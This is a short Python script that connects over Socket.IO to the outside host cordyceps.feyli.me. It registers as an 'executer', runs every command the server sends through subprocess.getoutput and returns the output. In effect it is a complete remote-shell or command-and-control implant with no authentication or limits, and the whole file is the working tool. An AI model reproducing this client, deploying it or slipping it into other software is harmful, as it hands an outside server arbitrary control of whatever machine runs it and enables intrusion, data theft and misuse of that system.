import subprocess
import socketio

# Create a Socket.IO client
sio = socketio.Client()

# Event handlers
@sio.event
def connect():
    print("Connected to server")
    sio.emit('identify', 'executer')


@sio.event
def disconnect():
    print("Disconnected from server")


@sio.event
def command(data):
    try:
        # Execute the received command
        output = subprocess.getoutput(data)
        # Send back the output
        sio.emit('output', output)
    except Exception as e:
        print(f"An error occurred: {e}")
        sio.emit('error', str(e))


@sio.event
def exit():
    print("Exiting...")
    sio.disconnect()
    exit()


# Connect to the server
print("Connecting to server...")
sio.connect('https://cordyceps.feyli.me')

# Start the event loop
sio.wait()
